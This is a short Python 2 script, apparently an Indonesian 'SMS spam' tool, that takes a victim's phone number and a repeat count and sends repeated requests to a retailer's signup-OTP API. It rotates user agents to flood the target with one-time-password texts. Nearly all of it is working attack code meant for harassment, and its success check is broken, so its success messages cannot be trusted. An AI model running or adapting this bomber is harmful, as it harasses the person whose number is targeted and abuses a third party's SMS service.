# -*- coding: utf-8 -*-
import requests,json,time,os,sys
from fake_useragent import UserAgent
from requests.exceptions import *

ua = UserAgent()
url = "https://cmsapi.mapclub.com/api/signup-otp"
hd = {
"Connection": "keep-alive",
"user-agent": ua.random ,
}
os.system('clear')
print """\n\x1b[1;91m╔╦╗┌─┐┌─┐┌─┐┬  ┬ ┬┌┐ 
║║║├─┤├─┘│  │  │ │├┴┐
\x1b[1;97m╩ ╩┴ ┴┴  └─┘┴─┘└─┘└─┘\n"""
os.system("echo x•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••x | lolcat -a")
os.system("echo Nama Tool: Spam Sms MapClub | lolcat -a")
os.system("echo Author: N4B1Lx75 | lolcat -a")
os.system("echo Whatsapp: +628811883541 | lolcat -a")
os.system("echo Github: https://github.com/AbilSeno | lolcat -a")
os.system("echo Youtube: Nothing | lolcat -a")
os.system("echo x•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••x | lolcat -a")

no = raw_input('\x1b[1;91m[•] Contoh : 628xxx\n\x1b[33m[?] Masukkan nomor target : ')
jum = int(input('\x1b[1;97m[•] Masukkan Jumlah spam : '))

dat = {
"phone" : no ,
}
for i in range(jum):
        r = requests
        woy = r.post(url,data=dat,headers=hd)
        if 'error' in woy:
                   print ("\x1b[1;91m[~] Gagal mengirim pesan ke "+no)
        else:
                   print ("\x1b[1;92m[✓] Sukses mengirim pesan ke "+no)

